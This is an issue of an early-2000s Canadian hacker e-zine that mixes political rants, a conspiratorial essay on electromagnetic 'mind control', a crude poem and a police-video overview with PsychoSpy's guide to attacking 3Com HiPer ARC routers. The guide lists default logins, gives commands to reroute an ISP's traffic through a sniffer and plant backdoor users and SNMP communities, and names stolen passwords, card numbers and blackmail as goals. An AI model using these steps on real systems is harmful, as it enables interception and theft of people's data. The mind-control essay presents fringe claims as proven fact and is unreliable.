News; K-1ine zine opens IRC channel for the readers
`-=-.-=-.-=-.-=-.-=-.-=-.-=-.-=-.-=-.-=-.-=-.-=-.-=

[01.19.01]

K-1ine zine officially opened its virtual irc doors about
two weeks ago with the creation of the '#k-1ine' channel on 
the independent and free speech advocating server; 'At0mix'
(irc.at0mix.net).

Feeling the obligation to shorten the barrier between the
maintainer and reader, I have decided to use irc as the main
communication tunnel for me to keep everyone updated on future
issues, as a place to discuss past issues, and for anyone to
conveniently submit original article(s) to me.

Since the K-1ine's mailing-list demise several months ago because 
of inactive subscribers and full/invalid e-mail accounts, I've taken 
on another approach in hopes that this form of safe and real-time 
communication will prove successful. 

Now what the hell are you waiting for? Get over to #k-1ine now...

note: these rules apply; *NO* flooding, *NO* begging for credit cards,
      *NO* asking for help with DoSing users/hosts, *NO* "how do I hack?"
      questions (or any variation of it). Say what you want, but expect
      and respect other users' constructive criticism. Don't break any
      of these rules and you should be fine.

                            Fuck Bill C-68

                 Registration is only for two things;
                      taxation and confiscation.

As of Jan 01, 2001, approximately 1 million Canadians have registered their
firearms. This leaves an estimated 6-9 million Canadians who have opted not
to. The majority of Canadians have stated time and again that they did not
want firearms registration. And here we stand.

This "project" has clearly failed. What now? The appropriate thing to do would
be to admit it failed on a grand scale, and to rethink the plan here, or even
drop the whole idea. Not likely I say. So what now? 6-9 million Canadians
become criminals overnight? Yeah.

I could feel it coming fast when Kim Campbell was used as a sacrificial cow to
railroad oppressive gun legislation into place in 1992. It all lead up to a
moment we all knew was coming sooner or later. Forced firearm registration. We
stand at the pivot to complete disarmament of honest Canadians. First
taxation, then mass confiscation as even more opressive and restrictive
legislation is brought forth.

Now, I am not going to rant on about the many reasons so many Canadians feel
they should have the right to bear arms. Regardless of which side you stand on
in the firearms debate, "are guns good or bad?" is really not the issue. The
issue is that our government has blatantly gone against the wishes of the
majority of this countrys citizens. What will happen to the majority of gun
owners who chose not to register still remains to be seen.

I saw this coming and I see the next giant one coming too. Mark my words, the
next big one you will be facing is an Orwellian cashless society. No more
paper and coin currency. All digital; all purchases, income, and movements
tracked. Think really hard about that one for a while. Then decide whether
your credit/debit cards are convenient for you, or convenient for Big Brother.
Think about that as you watch our government take away honest citizens
firearms, while the criminals/cops keep theirs.  From this point on, the
unarmed masses will be easily forced to follow the rules dictated by the
elite group of people that control this country. Fuck Bill C-68.

     An Introduction to A-TIP (Alarm-Triggered Internet Protocol)


   Date: Sunday January 14, 2001

Contact: EMAIL theclone@hackcanada.com
         URL http://www.nettwerked.net

Intro - * A-TIP: What is Alarm-Triggered Internet Protocol?
  
Tech  - * VINE:  What is Versatile Intelligent Network Environment?

-

 Introduction:

 On July 5th 2000 the Seal Beach and Los Alamitos Police Departments
 announced that after three months of rigarous beta-testing the
 Alarm Triggered Internet Protocol Video Project has demonstrated to
 be a successful proof of concept tool for law enforcement agencies.

 Seal Beach and Los Alamitos Police Departments inaugurated the program
 in an effort to enhance the law enforcement response to the high risk 
 calls for assistance, provide a much greater security to the public in
 buildings (i.e. banks), schools and high crime urban areas.

 By using the A-TIP Video system, the law enforcement response to an 
 emergency call for assistance is greatly enhanced due to its noteable 
 technological benefits:

 * A-TIP Video system allows a police dispatcher and responding officers
   to view, via a wireline secure Internet site (https) from the office or
   the Mobile Vu daylight readable computer monitor utilized in police 
   vehicles... the internal video feeds from the location where a call for 
   police assistance has been initiated. 

 * A-TIP Uses triple DES encrypted wired as well as wireless spread spectrum
   modulation to route three to five frame per second real-time video data 
   via the VINE (Versatile Intelligent Network Environment) technology relaying
   video monitoring network. Spread spectrum technology, which was invented in
   1941 by famous actress/inventor Hedy Lamarr, is a radio-frequency enhancement
   which takes a packet of RF data and forces it to "channel hop" making it next
   to impossible intercept properly. Spread spectrum technology is most commonly
   associated with CDMA/TDMA/GSM standard wireless telephone networks.
 
  For example, today when a bank robbery alarm is activated officers
  take the proper positions around the bank and closely observe the exterior
  activity and attempt to determine the conditions within the location. More
  often then not the alarm activation itself was a simple error. A-TIP technology
  would allow an informed cautious law enforcement deployment without exposing the
  public, bank employees or law-officers to any unnecessary risks.

  The Seal Beach and Los Alamitos Police Departments are extremely confident
  that implementing a secure, stable, password protected video network via
  spread-spectrum wireless and wired connection to the Internet will be a very
  valuable tool in crime suppression while enhancing the law enforcements response
  to emergency calls for assistance.
 
   The sponsors of this project are:

  1. Loronix Information Systems, Inc., "a publicly held company 
     headquartered in Durango, Colorado, designs, manufactures 
     and distributes networked digital video management systems to 
     industries worldwide. Loronix Digital Video Management Systems
     provide innovative technical solutions, which enable users to 
     manage, control and integrate digital video data throughout 
     their enterprise in a cost effective and easy to use manner."

  2. Litton Industries, Inc. "a publicly held company headquartered in 
     San Diego, California, designs, manufactures and distributes the
     Mobile Vu daylight readable computer monitor utilized in police
     vehicles."

---
    VINE (Versatile Intelligent Network Environment) technology 
   		relaying video monitoring network

  The following VINE features are critical to the A-TIP application:
     
     * high bandwidth - streaming video requires fast data circuits
      (i.e. cable-modem) - approximately ten times faster than what 
       a typical high-end dial-up modem can provide.

     * Roaming Mobile Subscribers (RMS) - the police vehicles need a
       wireless system to get access to the audio/video data; modem
       connections over cellphone circuits are at a deathly slow
       maximum speed of 9600 baud. General Packet Radio Service (GPRS)
       implemented in police vehicles would, in theory, produce speeds at 
       approximately the same rate as DOCSIS-compliant/Motorola CyberSURFER
       cable modems.

     * unlicensed radio bands allow rapid deployment - the system
       operates in the "Industrial, Scientific and Medical" radio bands,
       which do not require an expensive and time-consuming license
       application and filing process before the system can be assembled.
     
     * spread spectrum modulation is jam-proof and resistant to
       eavesdropping - originally developed for special military 
       applications, spread spectrum is now widely used for civilian 
       CDMA/TDMA/GSM standard wireless telephone data networks.
     
     * uniquily-designed repeater feature allows a city-wide coverage
       area - the proprietary VINE protocol, which allows the network
       designer to extend service to areas that cannot establish direct
       line of sight to the network hub by equipping a subscriber node
       with a second antenna which serves as a remote access point for
       further nodes. 

     * dynamic reconfiguration allows a roaming mobile node to be
       detected and then forced to join the A-TIP network when it
       appears in the service area.

		  'Mind Control: A Plausible Threat'


A: Introduction

The advances in technology have granted the human race an efficient and 
effective method of computing on a day to day basis. But with every gain,
there is an equally destructive and devastating effect. For example, the 
widespread implementation of computers created mass simplicity for most of
the operations in which we engage in. On the other hand, computers now offer
a whole new level of terrorism and illegal acts. This basic principle can be
applied to practically all types of major technology advances. In this paper
I will be focusing in one specific region of technology, that being Electro-
magnetic Radiation (EMR). EMR is very common in many devices including cell
phones, and our brains, among countless other things. But with the study of
EMR and it effects some disturbing capabilities have been proposed and also
implemented. Those effects being mind control. Mind control technology is 
very real, and should not be overlooked. I intend to prove that mind control
technology does exist and should be considered a threat to the entire popul-
ation of the world. Throughout this paper I will briefly explain the applic-
able types of EMR, show evidence of mind control technology and explain the
threats and possibilities of such technology. 

B: Exposition

Extremely low frequency electromagnetic radiation (herein referred to as ELF 
EM Radiation) is a naturally occurring, as well as synthetically produced form
of radiation. In most cases it is an unavoidable byproduct emitted from such 
devices as electronic motors and fluorescent lights, and, our brains. ELF EM
Radiation is also very easily absorbed into the human body.

An AC current can be loosely defined as the movement of electrons through a 
conductor, in roughly the same direction. Within this current both an AC 
electrical field and an AC magnetic field are created. Both of these fields
combined are called an electromagnetic field (EMF). The AC electrical field
is created from the strength of the AC charge, where the AC magnetic field
is created by the motion of the charge. These fields are emitted into the air,
and can be picked up by the skin on a human, usually a slight tingling sensation
on the skin. This effect can usually be felt near high voltage power lines and
power stations. EMR is basically the same thing as EMF. Scientists and other
professionals usually refer to EMR as EMF to eliminate the confusion within
the word `radiation', as it is usually associated with the deadly emissions 
from nuclear reactors and x-ray machines. Rather, ELF EMR is a specific
reference to a certain range of wavelengths within the EM spectrum, more-so
the 1 - 70Hz frequencies.

Evidence of electrical activity was first discovered in 1875 by an English
physician named Richard Caton. Later on, in 1929, a German neurologist was able
to demonstrate the electrical activity within the human brain, and record it on
paper. This recording is known as an EEG or an Electroencephalogram. It is only
comparatively recently that the brain has been regarded as the main coordinator
of all the body's activities. Because of its well-protected position within the
cranial cavity, the brain was the last of the body's organs to be exposed and
dissected. Since the liver was believed to be the largest organ and the most
richly supplied with blood, it was the first organ to be considered the seat of
the mind and soul. Later the heart was assigned this function, and this notion
still persists to some degree, especially in songs and poetry. But today's 
technology and scientific advances have proven to us that the brain is, in fact,
the mediator for the entire body. 

Under most circumstances our brains emit ELF EMR, specifically between 6Hz and
12Hz. Brain waves that are below 8Hz are considered Theta waves. This type of
brain wave is found to be closely related to creative thinking, for example,
a musician writing a piece of music. Between 8Hz and 12Hz are the Alpha waves
and are directly related to deep meditative states, such as REM sleep. It has
been found that these waves are only stable when the eyes are closed. When the
eyes are open, the Alpha waves become interrupted and irregular. This phenomenon
is known as Alpha Blocking. The highest of this range are the 12Hz frequencies
and are considered Beta waves. Beta waves are directly related to analytical
thinking, for example, solving an arithmetic problem. Slow, irregular brain waves
are called Delta waves, and these brain waves are considered to be an abnormal
emission and are good evidence of a brain tumor, or brain damage in a particular
area. The discovery and research of brain waves has brought amazing capabilities
in studying the brain's logistics. Amazing medical breakthroughs in diagnostics
of the brain can be attributed to the study of brain waves. But this knowledge
has lead to some of the most threatening possibilities mankind has ever encoun-
tered, that being mind control.

C: Evidence

Evidence of mind control has been existent since the early 1950s. The most comm-
only known incident is Project MKULTRA. Project MKULTRA began in 1953 when CIA
Director Allen Dulles, concerned about communist brain washing of Korean POWs,
authorized Project MKULTRA. Although this project was primative and hardly of
any comparison to the power of ELF EMR, it did lead to unusual and inhumane
testing financed by the CIA. 5-years later when MKULTRA was reviewed a concern
was voiced and the consensus was made to keep MKULTRA away from the public at
all cost. One CIA auditor wrote  "Precautions must be taken not only to protect
operations from exposure to enemy forces but also to conceal these activities
from the American public in general. The knowledge that the agency is engaging
in unethical and illicit activities would have serious repercussions in polit-
ical and diplomatic circles."

Between 1955 and 1975 the US Army enlisted 7 000 soldiers and used them for test-
ing of experimental chemical and biological warfare agents including LSD, PCP and
BZ (See appendix A).
	
In 1975 most of the records from Project MKULTRA were destroyed, but some escaped
to be viewed by the entire population of the USA, uncovering the schemes of the
CIA against high political leaders. The most common of the incidents was the CIA's
fascination with LSD, during MKULTRA. They experimented with it in hopes of find-
ing a method to make victims vulnerable, thus giving CIA interrogators an upper
hand at gaining the knowledge held in ones mind.

Dr. Jose Delgado was a pioneer in electronic mind control, but also a ruthless
man who had no regard for human rights or humanity in itself:

"We need a program of psychosurgery and political control of our society.
The purpose is physical control of the mind. Everyone who deviates from the given
norm can be surgically mutilatedà. The individual may think that the most important
reality is his own existence, but this is only his personal point of view. This
lacks historical perspectiveà. Man does not have the right to develop his own mind.
This kind of liberal orientation has great appeal. We must electrically control the
brain. Some day armies and generals will be controlled by electrical stimulation of
the brain" (Delgado, 1985). 

Fascinated with the brain and its effects when stimulated by electronic radio waves,
Delgado initiated in extensive research regarding mind control and manipulation. In
1966 Delgado publicized his findings. He had created a small electronic device,
which could be implanted into the brain and wielded extremely frightening results
at the push of a button. He called this device the stimoceiver, which used FM waves
to manipulate subjects. Using this device he was able to remotely induce a wide range
of human emotions including rage, lust and fatigue. Approximately 300 people have been
secretly implanted with one of these devices and used as a test subject without their
consent. There are no records of victims being able to get implants removed, nor
records of an implant being confiscated.

He also announced "the distasteful conclusion that motion, emotion and behavior can
be directed by electrical forcesà. Humans can be controlled like robots by push
buttons." Delgado even went as far as to remotely manipulate a bull on CNN in 1985.
Other neurophysicists took this concept to another level. During 1982/1983, a Dr.Ross
Adey of the University of California created a device he called the LIDA (See appendix B).

Using ELF EMR it was proven to alter a victim's EM brain waves, thus manipulating behavior.
"It looks as though instead of taking a valium when you want to relax yourself it would be
possible to achieve a similar result, probably in a safer way, by the use of a radio field
that will relax you" said Dr. Ross Adey, chief of research at the hospital. 
Allen Fray, another neurophysicist, took this research to a new level.

By transmitting electromagnet pulses, he was able to induce sleep on a victim and transmit
acoustic sounds such as booming, and buzzing.

Developing on Frey's earlier work, a Dr. Joseph Sharp at the Walter Reed Army Institute of
Research, was able to transmit actually voice directly to the brain via pulsed EMR waves.
Sharp, sitting inside an EMR Field was able to clearly hear the words spoken by a colleague.
The US military and intelligence community was quick to capitalize on these new discoveries.

Secret research programs on electromagnetics have never been made publicly accessible under
the Freedom Rights Act. Fortunately the US military hasn't been so quick to snuff the voices
of actual victims. A few victims have released letters and WebPages regarding their alleged
testing and what exactly they are experiencing. One man, here in Canada, has released a let-
ter claiming he is a victim of mind-control and that the RCMP is involved (See appendix C).
Mr. Koski's allegations blatantly prove the fact that mind control technology does exist and
is being secretly tested on humans without prior consent. The effects and states that Mr.
Koski was experiencing are directly related to those of all the mind-control devices prev-
iously listed. If, in fact, Mr. Koski is a victim of such inhumane experiments, doesn't that
make all of the World, let alone Canada, at risk to such attacks? What if the government was
able to harness such a manipulative power? What would become of freedom? Would humans no lon-
ger have the right to live? These are very real risks and should not be taken lightly.

D: Threats and Prevention

Mind control devices used as weapons against humans can yield a variety of different results
ranging from induced sleep, to even heart attacks (See appendix D).

If the government could wield such a power in today's world, war would be imminent.
For example, if the CIA were able to implant any of the world's political or military
leaders they could manipulate the workings of the whole world. That is where our freedom
ends, no more freedom of speech, nor human rights. The world as we know it today would
cease to exist; humans would simply be puppets on a large stage, the government being
the puppet masters. You may be thinking that this is a remote threat and very outlandish,
but it is not. As everyday passes the world becomes more corrupt. More and more devices
are being constructed which will seize control over the general population and sooner or
later destroy humans. Unfortunately, there is no prevention against these threats.
Civilians just don't have the power in today's society to change anything anymore.
We are told we live in a democracy, but it is more of a dictatorship. The future for
mankind is looking dim and bleak.

E: Conclusion

You may think that this paper is a pile of rubbish, which contains neither factual
data nor hard evidence, or you may entirely believe what I have written. Whichever
route you choose to take in your life you will be faced with the fact that the world
is changing around you, regardless of what you choose to believe. Human rights are
soon to be stripped and we will be sacrificed in the name of profit. As The Clone
puts it:

"Our conception of reality is nothing but a dance of electronic images fired into
 our forebrains, a gossamer construction of our masters, designed so that we will
 not under any circumstances perceive the actual. Our lives, controlled by electronic
 connections - the media manipulator, the cyberneticist, and of course the government.
 We're nothing but the puppets, and they are the puppetmasters" 
 
(Oct. 10, 2000, http://www.nettwerked.net/emc.txt)

Hopefully my writings inspired you to go out and research this dilemma yourself.
If the population has any chance in saving themselves, it's through the masses.
We, as humans, must join together and deny the government their wish of pure mass
domination.

                          excerpted from 'Rivet'

the first time I went to america
i got so drunk
i shit in my pants

we borrowed a car and drove down to buffalo
there was a lot of snow there
and we were unprepared
but after a few frostybrews
who cares?

the first thing i noticed was how cheap
the booze was
i mean, really cheap
forget the chicken wings
lets get pissed!

we rented a room at the lafayette hotel
but we didn't sleep there
i slept face down in a snowbank
with my pants full of hist
my girlfriend at the time
her name escapes me now
was not impressed
but i'd hid the car keys, so there

we started at a bar called Quinns
it was a small dumpy bar full of old geezers
there was old fight posters on the walls
i ordered a beer and  a scotch
it came to two dollars and twenty cents
the next round i ordered a beer and a double scotch
again it came two dollars and twenty cents
 it tipped the bartend a buck, and he said
you're not from around here
i asked him if he knew where the punk bars were 
 he said, this is a punk bar
 the sun was till up when we left there
the girl, i think her name was sandy
was already a weevin
we bough a six pack of cans and started wandering around
we eventually found allen road
where all the bars were
we went into one
a poster said, jack dekesyer was playing that night
so we went to another bar
we ordered more drinks
and my gal, actually i think her name was sally
that it, sally ordered a fired bologna sandwich
it was so beautiful that i had to order one too
me and sally were having a great time
and it was only eight o'clock
we met lots of nice americans
who were used to hanging out with drunk
canadians
one guy said, you know what i like about you canadians?
nothing
jammed my cigarette into his eye

we had to go to another bar
this next bar was a disco
i staggered up to the dj's booth
and said
you know what i like about you americans?
nothing
he smiled
i turned around and threw my beer across the room

the next bar we went to was more like a sports bar
i said to the bartender, as he deposited my drink
how about them bills?
he man, have you got a gun?
i heard all you yanks have guns, lets shoot em up
sally said, why don't you calm down
i said, lets fly to persia
drape an american flag over a machine gun
and flay some babies
sodom insane
the guy next to me smiled at that one
guns and cars  
rape and murder
god bless america

we staggered around some more and got lost
sally started to cry
i said, are you crying cause we wasted fifty dollars
on the motel room
yes, she said, through the tears
i think that's when i shit my pants
fried bologna sandwich, a dollar seventy nine

i took my shit home with me the next day
america has enough shit already
the guy at customs said, what smells?
i said, america smells my friend and he let us through.

Theoretical Attack Against 3Com HiPer ARC - By PsychoSpy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

After hours of scanning my local prefix my eyes where becoming heavy, my
bed looked more and more tempting, and the pain of failure began to set
in as no carriers where found.

Then suddenly, out of the dark I hear the all too familiar, and absolutely
distinct sound of my modem connecting to a another.

My scanning program pops up with what the box had displayed upon connect.

What's this I see?

------------------------------

CONNECT 2400

Welcome to 3Com Total Control HiPer ARC (TM)
Networks That Go The Distance (TM)

login: 

------------------------------

SWEET!!

This, my friends, was the beginning of an adventure. Most of this adventure, 
however, took place in my mind, and that is what this file is about. I did 
gain full access to this system and could have, theoretically, done all of 
the things which I will talk about. However, due to my current situation, 
I did not.

The methods and ideas which I put forth to this specific application could
be easily adapted to any router which a person hacks, and could be just as
much fun.


About the 3Com HiPer ARC Box
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The 3Com HiPer ARC is actually one part of a larger system. The larger system
which the HiPer ARC is part of is called the "3Com Total Control« 1000 
Multiservice Access Platform."

This whole system and it's intricacies are beyond the scope of this file, and
therefor will not be discussed in any great detail.

The HiPer ARC system itself is basically the Total Control 1000's router. ARC
stands for Access Router Card. The ARC is best described in 3Com's own words;

"The Total Control 1000 access router card (ARC) functions as the secure IP 
gateway between the public switched telephone network (PSTN) and the service 
provider's network. The ARC is a high-speed IP forwarding system that processes 
digital and analog calls, with embedded security mechanisms to prevent unauthorized 
users from accessing the network. After the access router card processes ingress 
signals, user data is routed to various destinations across the network. The ARC 
includes an advanced RADIUS client that supports centralized authorization, user 
attributes (which services are allowed), and administration, such as accounting, 
to further reduce the cost of ownership and easily deploy new revenue-generating 
services.

The router card set provides full access routing functionality, including firewall, 
protocol filtering, compression, and authentication. In a dual card set implementation, 
it can be configured to share the workload and provide redundancy in case of a hardware 
failure. The ARC also offers powerful flexibility to network designers by providing 
multiple NIC interfaces. All NIC interfaces include standard 10/100 Ethernet, with 
options for V.35 Frame Relay/PPP, T1/E1 Frame Relay/PPP, X.25, and DS-3 ATM. Such 
flexibility enables service providers to support multiple customer needs in a single 
Total Control 1000 platform."


Information Gathering
~~~~~~~~~~~~~~~~~~~~~

One key to every successful attack of any kind online is to be efficient 
at gaining enough of the right information on the company, hardware, 
software, techies, etc.

The most important information, obviously, in this scenario however, is either the
dial-in phone number for the ARC, or the Telnet address to it. Either one will work,
and both can be found using the same good old scanning, or social engineering skills
as have been in use since the dawn of the personal computer, and modem.

Once you have the phone number/ip address, you must first learn the system and its 
commands as much as possible. This is needed so that you can work your way throughout
the system with ease, and efficiently. The less time you need to spend in 
the system the better off you are.

Here's a list of documents you may want to take a look at;
	
	Configuration Procedures;
		http://totalservice.3com.com/ISP/arc/acon.html

	Various HiPer ARC Documentation;
		http://totalservice.3com.com/ISP/arc/doc1.html

	HiPer ARC Reference Manual Release Addendum;
		ftp://totalservice.3com.com/pub/.docs/arcref10ad.pdf

	An On-Line Quick Reference for Command Line Interface;
		http://totalservice.3com.com/ISP/arc/acli.html

I suggest printing off the appropriate Quick Command Refence for what you're doing,
as it can really help on the fly.

Another thing to figure out is the targets business hours. It is best to target the
ARC when they are closed for the business day (if possible) and when there will be 
a maximum amount of traffic across the ARC. This will only be possible if it is a 
small ISP, and possibly in a few other occasions.


Possible Vulnerabilities
~~~~~~~~~~~~~~~~~~~~~~~~

This section is quite short as there has only been one major vulnerability which I
have, personally found, in the ARC system. This is the classic problem of a weak 
login and password.

In fact, all three of the HiPer ARC systems I have played with, or even seen, have
had a default password or two in them.

The two default passwords I have found are;

	Login       Password
         adm         (none)
        3Com          3Com

Also, if neither of these work, take a look for any other 3Com default passwords at;
	http://packetstorm.securify.com/docs/hack/defaultpasswords.txt

This list will also be helpful for any other switches/routers you decide to take on.


Equipment Needed
~~~~~~~~~~~~~~~~

	1 - Old Computer Setup with a Packet Sniffer, and IP Forwarding
	1 - Old Computer with a modem, terminal emulator, etc.


The only piece of equipment which may take a little time to setup is the router/sniffing
box. All you have to do for this is setup a computer with two ethernet cards, and a *nix 
operating system with a packet sniffer, and IP Forwarding enabled.


Theory Behind The Attack
~~~~~~~~~~~~~~~~~~~~~~~~

Now that we have gained most of the knowledge which we will need for this attack, I 
will briefly explain what exactly it will entail. Once I have finished this section,
I will get into the nitty gritty of it all.

What we are basically going to do, is break into the system in question, exploit it's
weak passwords, and reroute traffic through our routing/sniffing box.

What this will do, along with the proper filter on the sniffer, is give us all the
information which anyone connected to this router is sending across the net. This 
information can include personal/business e-mails/communications, credit card numbers,
bank account information, passwords to personal web accounts, a business, e-mail, etc.

This method of attack could also be used for corporate espionage, to black mail, or 
expose people. The possibilities are truly endless.


Attack Time
~~~~~~~~~~~

Now that we have the manuals for this box memorized (hahaha, right!), our router/sniffer
box up, running, and TESTED, we're ready to go. That is assuming of course you have the 
dial in, or IP Address.

The first step of the actual attack, and most crucial, is to dial in to the ARC system.
Once you've got the login prompt in front of you, try the default login/passwords which
I gave you above.

Once you've got a correct login/password you'll see a prompt resembling this;

	HiPer:

At this command Line type "manage";
	
	HiPer: manage

	manage:

This command will give you access to all of the management functions within the ARC.
For our purposes, we are only going to be concerned with the routing tables at this
time. However, lots more could be done from this area, all of which is covered in the
documents linked above. One thing which could be accomplished before we type manage,
while at the HiPer: prompt, is to telnet, or rlogin into a system. This could allow 
someone the ability to attack other systems within the routers trust network, or other
systems online.

Now that we're into the management area, we're going to want to get right to work on the
routing tables.

Before we actually modify the routing tables you'll want to view the current configuration
and be sure to write it down for when we need to switch everything back. You'll also need
this information to modify the IP Routing table for your routing/sniffer box, so everything
works out. To display the current IP Tables type:

	list rtab preferred

This will display all the current IP Table settings. You'll also want to run the "list 
ip defaultroute" and "show ip routing" commands. Be sure to take this information as well.

Now, add a static route from your IP address to any outside address. This will keep the
information from just looping between your computer and the router, which could cause a
horrible situation.

To do this try the command;

	add ip route &lt;ip_net_address>
			gateway [gateway_addr]
			metric [hop_count]

An example of its usage would be;

	add ip route 10.237.1.43/h gateway *.*.*.* metric 3

This is assuming that your router/sniffer box is 10.237.1.43, and that the traffic will
be on its third hop before it hits the ARC again (for the second time).

Now we'll want to double check and make sure that static routing is actually enabled. 
Just to be sure throw this command into the ARC;

	enable ip static_remote_routes

Next, we'll finish the job off by telling the system to send all other traffic through
your box. This can by done by using;

	set ip defaultroute gateway 10.237.1.43 metric 1

This again is assuming your IP is 10.237.1.43 and that the traffic would be on its first
hop in the network.

Now that that is completed, you can expect to see tons of traffic going through your box.
If you find that there is so much traffic running through the single router box you have,
try running through the ARC manuals and figuring out how to section off different IP blocks
to send to different router addresses. Once you've done this, you could setup multiple 
router/sniffer boxes and gain more information than you'd even WANT to know.

Also think about leaving an extra user or two on the system before you leave. Be careful
with this because the admin might be alerted to the presence of a new account. The options
and commands to create a few different kinds of new accounts are listed below.

	Adding a new user 

		add user [name] 
		Enabled [yes|no]
		Login_service [rlogin|telnet|cleartcp|ping]
		Network_service [ppp|slip]
		Password [password]
		Type [login,network,callback,dialout,manage] 

	Adding to the table of SNMP authorized users 

		add snmp community&lt;community_name> 
		Address [IP_address]
		Access [ro|rw|adm]
		Community_pool [name]
		Validate_address [use_address|use_pool] 

	
Another place of interest is the SNMP information you can gain from here. SNMP can allow
you to monitor and change much of the same information which you just did. To view the SNMP
communities installed on the ARC server (which will allow you to get in), use;

	list snmp communities

Also think about adding your own SNMP community.

	add snmp community&lt;community_name> 
		Address [IP_address]
		Access [ro|rw|adm]
		Community_pool [name]
		Validate_address [use_address|use_pool] 

You'll also need to find out what community pools you can choose from;

	list snmp community_pools

As well as add yourself to the authenticated users list for the community;

	add snmp community&lt;community_name> 
		Address [IP_address]
		Access [ro|rw|adm]
		Community_pool [name]
		Validate_address [use_address|use_pool]

There are TONS of other fun things you could do in here to dig yourself into the system, 
and all of them are covered in detail in the reference guides, and user manuals.


Cleaning House
~~~~~~~~~~~~~~

You're probably not going to want to leave this routing going on for longer than a weekend,
otherwise you'll probably be noticed by some techie out sitting beside the ARC. Because of
this, I HIGHLY suggest that after these couple days you return the routing to what it was.

All you need to do is the reverse of everything we did before. It's as simple as that, and
only takes a few minutes. Don't worry about not having enough e-mails, passwords, sites,
etc. to play with, because you'll have more than enough for months and months of fun.


Outro
~~~~~

Well, until next time, take care everyone and try to stay out of trouble.

Shouts out to The Clone, Cyb0rg/asm, Ne0nRa1n, Agent_Smith, and everyone 
else out there who's helping the scene up here in the great white north.

Wardial of 452-(4000 to 6999) - By PsychoSpy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Well, after long evenings of my laptop busily buzzing away, here's my latest
WarDial. This dial was ranged towards 3M Corp. here in London Ontario. A 
majority of the numbers within the 4000 to 6999 range are extensions at 
3M Corp's Canadian Headquarters. 

I later figured out that it also covers a few downtown business' and Fanshawe
College. It may also cover some parts of London Intl. (CYXU) Airport, as I
heard the London Airport Commissioner answer the phone one time when I 
left the modem speaker on.

Anyways, have fun with these, there's some pretty interesting systems found
here. As always, be safe with them as well.
